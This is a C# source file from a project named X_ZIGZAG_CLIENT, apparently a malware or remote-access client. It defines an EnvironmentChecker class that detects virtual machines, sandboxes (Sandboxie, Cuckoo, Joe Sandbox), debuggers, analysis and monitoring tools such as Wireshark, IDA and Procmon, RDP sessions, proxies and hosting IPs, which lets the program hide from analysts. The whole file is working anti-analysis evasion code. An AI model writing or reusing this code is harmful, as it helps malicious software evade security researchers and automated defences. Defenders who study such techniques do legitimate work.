using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Linq;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Management;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;

namespace X_ZIGZAG_CLIENT
{
    internal class EnvironmentChecker
    {
        private static readonly string[] vmProcesses =
    {
        "vmtoolsd", "vboxservice", "vmsrvc", "vmusrvc", "vboxtray", "xenservice", "qemu-ga"
    };

        private static readonly string[] vmMacAddresses =
        {
        "00:05:69", // VMware
        "00:0C:29", // VMware
        "00:50:56", // VMware
        "00:1C:14", // VirtualBox
        "08:00:27", // VirtualBox
        "00:15:5D", // Hyper-V
        "00:03:FF", // Microsoft Virtual PC
        "00:0F:4B"  // Parallels
    };

        private static readonly string[] vmRegistryKeys =
        {
        @"SOFTWARE\VMware, Inc.\VMware Tools",
        @"SOFTWARE\Oracle\VirtualBox Guest Additions",
        @"HARDWARE\DESCRIPTION\System\BIOS\SystemManufacturer",
        @"HARDWARE\DESCRIPTION\System\BIOS\SystemProductName"
    };
        private static readonly string[] sandboxProcesses =
        {
             "sbiectrl", "snxhk", "nspectr", "wsb", "capesandbox", "joeboxcontrol", "analyze", "procexp", "zenbox"
        };
        private static readonly string[] knownSandboxFiles =
        {
            "C:\\windows\\sysnative\\drivers\\sandboxie.sys",
            "C:\\windows\\system32\\drivers\\sandboxie.sys",
            "C:\\windows\\sysnative\\drivers\\cuckoo.sys",
            "C:\\windows\\system32\\drivers\\cuckoo.sys",
            "C:\\windows\\sysnative\\drivers\\zenbox.sys",
            "C:\\windows\\system32\\drivers\\zenbox.sys",
            "C:\\windows\\system32\\vmGuestLib.dll",
            "C:\\windows\\system32\\vm3dgl.dll",
            "C:\\windows\\system32\\vboxhook.dll",
            "C:\\windows\\system32\\vboxmrxnp.dll",
            "C:\\windows\\system32\\vmsrvc.dll",
            "C:\\windows\\system32\\drivers\\vmsrvc.sys"

    };
        private static readonly string[] selectedProcessList =
           {
            "processhacker",
            "netstat",
            "netmon",
            "tcpview",
            "wireshark",
            "filemon",
            "regmon",
            "cain",
            "procmon",
            "sysinternals",
            "nagios",
            "zabbix",
            "solarwinds",
            "prtg",
            "splunk",
            "kismet",
            "nmap",
            "ettercap",
            "vmtoolsd",
            "vmwaretray",
            "vmwareuser",
            "fakenet",
            "dumpcap",
            "httpdebuggerui",
            "wireshark",
            "fiddler",
            "vboxservice",
            "df5serv",
            "vboxtray",
            "vmwaretray",
            "ida64",
            "ollydbg",
            "pestudio",
            "vgauthservice",
            "vmacthlp",
            "x96dbg",
            "x32dbg",
            "prl_cc",
            "prl_tools",
            "xenservice",
            "qemu-ga",
            "joeboxcontrol",
            "ksdumperclient",
            "ksdumper",
            "joeboxserver"
}
;
        private static readonly string[] rdpProcesses =
        {
            "mstsc", "rdpclip", "conhost"
        };
        [DllImport("kernel32.dll")]
        private static extern bool GetPhysicallyInstalledSystemMemory(out long totalMemoryInKilobytes);
        
       
        public static async Task<bool> IsRunningInVM()
        {
            return CheckForVMProcesses() || CheckForVMArtifacts() || CheckForVMHardware() || CheckForVMMACAddress() || CheckForCPUandMemoryDiscrepancies() || CheckRegistryKeys() || CheckForSandbox() || CheckForRDP() || CheckForVPSEnvironment() || CheckECCSupport() || IsServerCPU() || IsProxyDetectedUsingWMI() || IsProxyDetectedUsingRegistry() || DetectMonitiringTool() || DetectDebugger() || await IpChecker() || DetectEmulatorByTime() || DetectSandBoxByDll();
        }

        private static bool CheckForVMProcesses()
        {
            foreach (var processName in vmProcesses)
            {
                if (Process.GetProcessesByName(processName).Length > 0)
                {
                    return true;
                }
            }
            return false;
        }

        private static bool CheckForVMArtifacts()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string model = item["Model"].ToString().ToLower();

                    if ((manufacturer.Contains("microsoft") && model.Contains("virtual"))
                        || manufacturer.Contains("vmware")
                        || manufacturer.Contains("xen")
                        || manufacturer.Contains("oracle")
                        || model.Contains("virtualbox")
                        || model.Contains("qemu"))
                    {
                        return true;
                    }
                }

            }
            using (var videoSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController"))
            {
                foreach (var item in videoSearcher.Get())
                {
                    string videoName = item.GetPropertyValue("Name").ToString().ToLower();

                    if (videoName.Contains("vmware") || videoName.Contains("vbox") || videoName.Contains("qemu"))
                    {
                        return true;
                    }
                }
            }

            return false;
        }

        private static bool CheckForVMHardware()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_BIOS"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string version = item["Version"].ToString().ToLower();

                    if (manufacturer.Contains("vmware")
                        || manufacturer.Contains("xen")
                        || manufacturer.Contains("qemu")
                        || version.Contains("virtualbox")
                        || version.Contains("vbox"))
                    {
                        return true;
                    }
                }
            }

            using (var searcher = new ManagementObjectSearcher("Select * from Win32_Processor"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string version = item["Version"].ToString().ToLower();

                    if (manufacturer.Contains("vmware")
                        || manufacturer.Contains("xen")
                        || manufacturer.Contains("qemu")
                        || version.Contains("virtualbox")
                        || version.Contains("vbox"))
                    {
                        return true;
                    }
                }
            }

            using (var searcher = new ManagementObjectSearcher("Select * from Win32_BaseBoard"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string product = item["Product"].ToString().ToLower();

                    if (manufacturer.Contains("vmware")
                        || manufacturer.Contains("xen")
                        || manufacturer.Contains("qemu")
                        || product.Contains("virtualbox")
                        || product.Contains("vbox"))
                    {
                        return true;
                    }
                }
            }

            return false;
        }

        private static bool CheckForVMMACAddress()
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Exclude virtual network interfaces
                if (nic.Description.ToLower().Contains("virtual") || nic.Description.ToLower().Contains("vmware"))
                {
                    continue;
                }

                string macAddress = nic.GetPhysicalAddress().ToString();
                if (vmMacAddresses.Any(vmMac => macAddress.StartsWith(vmMac.Replace(":", ""), StringComparison.OrdinalIgnoreCase)))
                {
                    return true;
                }
            }
            return false;
        }


        private static bool CheckForCPUandMemoryDiscrepancies()
        {
            if (GetPhysicallyInstalledSystemMemory(out long memKb))
            {
                long memMb = memKb / 1024;
                if (memMb < 2048) // Typical VM setup
                {
                    return true;
                }
            }

            int logicalProcessors = Environment.ProcessorCount;
            if (logicalProcessors <= 2) // Typical VM setup
            {
                return true;
            }

            return false;
        }

        private static bool CheckRegistryKeys()
        {
            foreach (string key in vmRegistryKeys)
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key))
                {
                    if (registryKey != null)
                    {
                        return true;
                    }
                }
            }

            return false;
        }
        private static bool CheckForSandbox()
        {
            foreach (var processName in sandboxProcesses)
            {
                if (Process.GetProcessesByName(processName).Length > 0)
                {
                    return true;
                }
            }
            foreach (var filePath in knownSandboxFiles)
            {
                if (File.Exists(filePath))
                {
                    return true;
                }
            }
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string model = item["Model"].ToString().ToLower();

                    if (manufacturer.Contains("microsoft") && model.Contains("windows sandbox"))
                    {
                        return true;
                    }
                }
            }

            using (var searcher = new ManagementObjectSearcher("Select * from Win32_BIOS"))
            {
                foreach (var item in searcher.Get())
                {
                    string manufacturer = item["Manufacturer"].ToString().ToLower();
                    string version = item["Version"].ToString().ToLower();

                    if (manufacturer.Contains("sandboxie") || version.Contains("sandboxie"))
                    {
                        return true;
                    }
                }
            }

            return false;
        }
        private static bool CheckForRDP()
        {
            if (SystemInformation.TerminalServerSession)
            {
                return true;
            }
            return false;
        }

        private static bool CheckForVPSEnvironment()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                foreach (var item in searcher.Get())
                {
                    string model = item["Model"].ToString().ToLower();
                    if (model.Contains("vps") || model.Contains("virtual") || model.Contains("cloud"))
                    {
                        return true;
                    }
                }
            }
            return false;
        }
        private static bool CheckECCSupport()
        {
            bool isECCSupported = false;

            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_PhysicalMemory"))
                {
                    foreach (ManagementObject queryObj in searcher.Get())
                    {
                        if (queryObj["MemoryType"] != null)
                        {
                            ushort memoryType = (ushort)queryObj["MemoryType"];
                            if (memoryType == 24) // MemoryType 24 indicates ECC memory
                            {
                                isECCSupported = true;
                                break;
                            }
                        }

                        if (queryObj["ErrorCorrectionType"] != null)
                        {
                            ushort errorCorrectionType = (ushort)queryObj["ErrorCorrectionType"];
                            if (errorCorrectionType == 6) // ErrorCorrectionType 6 indicates ECC memory
                            {
                                isECCSupported = true;
                                break;
                            }
                        }
                    }
                }
            }
            catch (ManagementException)
            {
            }

            return isECCSupported;
        }
        private static bool IsServerCPU()
        {
            string cpuName = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
            if (cpuName.Contains("Xeon") || cpuName.Contains("EPYC"))
            {
                return true;
            }
            return false;
        }
        static bool IsProxyDetectedUsingWMI()
        {
            try
            {
                string query = "SELECT * FROM Win32_Proxy";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
                ManagementObjectCollection results = searcher.Get();

                if (results.Count > 0)
                {
                    foreach (ManagementObject result in results)
                    {
                        string proxyServer = result["ProxyServer"]?.ToString();
                        if (!string.IsNullOrEmpty(proxyServer))
                        {
                            return true;
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return false;
        }
        static bool IsProxyDetectedUsingRegistry()
        {
            const string registryKey = @"Software\Microsoft\Windows\CurrentVersion\Internet Settings";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(registryKey, false))
                {
                    if (key != null)
                    {
                        object proxyEnable = key.GetValue("ProxyEnable");
                        if (proxyEnable != null && (int)proxyEnable == 1)
                        {
                            return true;
                        }
                    }
                }
            }
            catch (Exception)
            {
            }
            return false;
        }
        public static bool DetectMonitiringTool()
        {

            foreach (var processName in selectedProcessList)
            {
                if (Process.GetProcessesByName(processName).Length > 0)
                {
                    return true;
                }
            }

            return false;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool IsDebuggerPresent();
        public static bool DetectDebugger()
        {
            if (IsDebuggerPresent() ||Debugger.IsAttached)
            {
                return true;
            }

            return false;
        }

        public static async Task<bool> IpChecker()
        {
            while (true)
            {
                try
                {
                    using (var client = new HttpClient())
                    {
                        var status = await client.GetStringAsync("http://ip-api.com/line/?fields=proxy,hosting").ConfigureAwait(false);
                        return status.Contains("true");
                    }
                }
                catch
                {
                }
                Thread.Sleep(15000);
            }
            
        }
        public static bool DetectEmulatorByTime()
        {
            try
            {
                var ticks = DateTime.Now.Ticks;
                Thread.Sleep(10);
                if (DateTime.Now.Ticks - ticks < 10L)
                    return true;
            }
            catch
            {
              
            }
            return false;
        }
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        public static bool DetectSandBoxByDll()
        {
            var dlls = new[]
            {
                "SbieDll",
                "SxIn",
                "Sf2",
                "snxhk",
                "cmdvrt32"
            };
            return dlls.Any(dll => GetModuleHandle(dll + ".dll").ToInt32() != 0);
        }
    }
}
